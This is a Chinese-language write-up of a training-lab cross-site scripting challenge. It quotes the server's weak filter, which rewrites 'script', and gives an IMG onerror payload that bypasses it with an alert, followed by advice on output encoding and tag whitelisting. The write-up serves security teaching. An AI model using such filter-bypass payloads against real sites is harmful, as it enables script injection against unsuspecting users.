# Cross Site Scripting One(跨站脚本攻击 1)

## 题介绍
页面输入框已经对输入进行了一些过滤，需要利用输入框提交一个可以执行alert的代码

## 功能实现 
点击页面 获得该用户 按钮 
```
POST /challenges/d72ca2694422af2e6b3c5d90e4c11e7b4575a7bc12ee6d0a384ac2469449e8fa HTTP/1.1

searchTerm=%3CIMG+SRC%3D%22%23%22+ONERROR%3D%22alert('XSS')%22%2F%3E&csrfToken=-127827516577406622538923948450307535312
```

后端实现代码 src/main/java/servlets/module/challenge/XssChallengeOne.java

```
String searchTerm = request.getParameter("searchTerm");
log.debug("User Submitted - " + searchTerm);
searchTerm = XssFilter.levelOne(searchTerm);
log.debug("After Filtering - " + searchTerm);
String htmlOutput = new String();
if(FindXSS.search(searchTerm))
```
在一个题基础上增加了一个 XssFilter.levelOne(searchTerm); 过滤功能

```
public static String levelOne (String input)
{
	log.debug("Filtering input at XSS levelOne");
	return input.toLowerCase().replaceAll("script", "scr.pt").replaceAll("SCRIPT", "SCR.PT");
}
```
将script变成了 scr.pt 导致无法执行

## 解题步骤  
直接在输入框中输入  即可
```
<IMG SRC="#" ONERROR="alert('XSS')"/> 
```

## 总结  

如上题所述，解决xss问题是个复杂的过程，本题仅是禁止输入script标签，所以很容易被攻击者绕过


如果您的系统没有富文本(包含标签的用户提交，如<a 等),可以直接采用编码输出的方法，将<, > 等进行编码输出  
如果您的系统需要富文本，则只能在接收到用户提交内容时进行白名单标签校验  

这类攻击的防御是非常复杂的，原因是前端页面的输出点太多，如html、javascript、css等等，有些输入点完全不需要任何特殊字符，因此在做好基础防御(输入与验证和编码输出)基础上，也要针对特定场景进行特殊验证